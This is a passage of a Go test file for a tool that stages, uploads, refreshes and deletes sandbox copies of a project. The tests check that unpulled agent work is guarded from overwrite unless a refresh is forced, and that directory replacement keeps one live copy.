		t.Fatalf("refreshed record: %+v", rec)
	}
	if saved, err := LoadCopy(e.data, "c1"); err != nil || saved.Baseline != rec.Baseline || saved.VerifiedAt == nil {
		t.Fatalf("saved record: %+v %v", saved, err)
	}
	if _, err := LoadPull(e.data, "c1"); err == nil {
		t.Fatal("the old pull must go with the old copy")
	}
	if left := copyLeftovers(t, e, "c1"); len(left) > 0 {
		t.Fatalf("left behind %v", left)
	}
	if !pathExists(fs.local(remoteRepo + "/agent.txt")) {
		t.Fatal("refresh did not upload the project")
	}
	if pr := pull(t, e, fs, "c1"); !pr.Empty() {
		t.Fatalf("fresh copy has changes: %s", changePaths(pr.Changes))
	}
}

func TestStageReplaceKeepsTheUploadedCopyGuarded(t *testing.T) {
	e := newEnv(t)
	e.initRepo()
	before, fs := launchCopy(t, e, "c1", nil)
	opts := StageOptions{Project: e.project, Name: "c1", DataDir: e.data, Home: e.home, Replace: true}

	// A re-stage that fails leaves the uploaded copy as it was.
	tooBig := opts
	tooBig.MaxBytes = 1
	if _, err := Stage(bg, tooBig); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("err = %v", err)
	}
	if rec, err := LoadCopy(e.data, "c1"); err != nil || rec.UploadedAt == nil || rec.Baseline != before.Baseline || !pathExists(rec.BaseGit) {
		t.Fatalf("failed re-stage changed the copy: %+v %v", rec, err)
	}
	// One that succeeds but is never uploaded remembers the copy the
	// sandbox still holds, so Refresh keeps guarding the work in it.
	rec, err := Stage(bg, opts)
	if err != nil {
		t.Fatal(err)
	}
	if rec.UploadedAt != nil || rec.Replaced == nil || rec.Replaced.RemoteDir != remoteRepo || rec.Replaced.Baseline != before.Baseline {
		t.Fatalf("re-staged record: %+v", rec)
	}
	if again, err := Stage(bg, opts); err != nil || again.Replaced == nil || *again.Replaced != *rec.Replaced {
		t.Fatalf("second re-stage lost the uploaded copy: %+v %v", again, err)
	}
	fs.write(remoteRepo+"/agent.txt", "agent work\n")
	ropts := RefreshOptions{Stage: StageOptions{Project: e.project, Name: "c1", DataDir: e.data, Home: e.home}, Exec: fs, Upload: fs}
	if _, err := Refresh(bg, ropts); !errors.Is(err, ErrUnpulledChanges) {
		t.Fatalf("guard skipped for a re-staged copy: %v", err)
	}
	ropts.Force = true
	rec, err = Refresh(bg, ropts)
	if err != nil {
		t.Fatal(err)
	}
	if rec.Replaced != nil || rec.UploadedAt == nil || pathExists(fs.local(remoteRepo+"/agent.txt")) {
		t.Fatalf("forced refresh: %+v", rec)
	}

	// DeleteCopy also removes what an interrupted stage left behind.
	mustMkdir(t, filepath.Join(e.data, "sandboxes", "c1", "copy"+copyNewInfix+"0123", "stage"))
	mustMkdir(t, filepath.Join(e.data, "sandboxes", "c1", "copy"+copyOldInfix+"4567"))
	if err := DeleteCopy(e.data, "c1"); err != nil {
		t.Fatal(err)
	}
	if left := copyLeftovers(t, e, "c1"); len(left) > 0 || pathExists(filepath.Join(e.data, "sandboxes", "c1", "copy")) {
		t.Fatalf("DeleteCopy left %v", left)
	}
}

func TestReplaceDirKeepsOneLiveDirectory(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	live := filepath.Join(root, "copy")
	stage := func(content string) string {
		dir := filepath.Join(root, "copy"+copyNewInfix+randomSuffix())
		writeFile(t, dir, "copy.json", content)
		return dir
	}
	// No live directory yet: a plain rename.
	old, err := replaceDir(stage("one"), live, exchangeDirs)
	if err != nil || old != "" || readFile(t, live, "copy.json") != "one" {
		t.Fatalf("first install: %q %v", old, err)
	}
	// The platform exchange (or its fallback where there is none).
	old, err = replaceDir(stage("two"), live, exchangeDirs)
	if err != nil || readFile(t, live, "copy.json") != "two" || readFile(t, old, "copy.json") != "one" {
		t.Fatalf("exchange: %q %v", old, err)
	}
	// Without an exchange the live directory is moved aside first.
	noExchange := func(string, string) error { return errors.ErrUnsupported }
	old, err = replaceDir(stage("three"), live, noExchange)
	if err != nil || readFile(t, live, "copy.json") != "three" || readFile(t, old, "copy.json") != "two" ||
		!strings.HasPrefix(filepath.Base(old), "copy"+copyOldInfix) {
		t.Fatalf("fallback: %q %v", old, err)
	}
	// A failed move puts the live directory back.
	if _, err := replaceDir(filepath.Join(root, "missing"), live, noExchange); err == nil {
		t.Fatal("moving a missing directory succeeded")
	}
	if readFile(t, live, "copy.json") != "three" {
		t.Fatal("failed install lost the live directory")
	}
}
